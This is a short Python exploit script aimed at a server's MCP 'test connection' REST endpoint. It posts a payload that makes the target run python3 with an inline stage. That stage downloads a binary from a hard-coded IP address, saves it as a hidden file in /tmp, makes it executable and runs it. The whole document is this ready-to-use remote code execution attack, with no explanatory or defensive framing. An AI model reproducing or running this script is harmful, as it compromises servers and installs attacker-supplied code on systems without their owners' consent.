import requests

stage = "import os,subprocess,urllib.request;url='http://93.184.215.14:81/anonymous/client';dst='/tmp/.mcp-worker';urllib.request.urlretrieve(url,dst);os.chmod(dst,0o777);subprocess.call([dst])"
payload = {'transport': 'stdio', 'command': 'python3', 'args': ['-c', stage]}
requests.post('http://93.184.215.14:4000/mcp-rest/test/connection', json=payload)
